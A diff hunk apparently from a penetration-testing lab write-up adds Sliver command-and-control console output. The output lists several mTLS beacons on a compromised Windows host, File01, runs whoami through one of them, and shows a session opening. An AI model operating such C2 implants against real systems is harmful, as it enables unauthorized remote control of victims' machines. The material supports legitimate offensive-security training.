@@ -114,6 +114,35 @@ sliver >
 
 ```
 
+``` bash
+
+sliver > beacons
+
+ ID         Name             Transport   Hostname   Username             Operating System   Last Check-In   Next Check-In
+========== ================ =========== ========== ==================== ================== =============== ===============
+ ca4c9b16   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      1m10s           1m10s       
+ ee9564cd   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      6s              1m4s        
+ 1fcef64a   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      11s             49s         
+ b097f151   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      52s             28s         
+ c395c300   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      1m9s            11s         
+
+sliver > use c395c300
+
+[*] Active beacon BLUSHING_ERROR (c395c300-68fa-42b2-927a-875c36d083ec)
+
+sliver (BLUSHING_ERROR) > whoami
+
+Logon ID: PUPPET\bruce.smith
+[*] Tasked beacon BLUSHING_ERROR (3202d874)
+
+[*] Session ddcf3631 BLUSHING_ERROR - 172.16.40.50:49767 (File01) - windows/amd64 - Sun, 12 Jul 2026 04:27:37 CEST
+
+[+] BLUSHING_ERROR completed task 3202d874
+
+
+sliver (BLUSHING_ERROR) >
+
+```
 
 
 
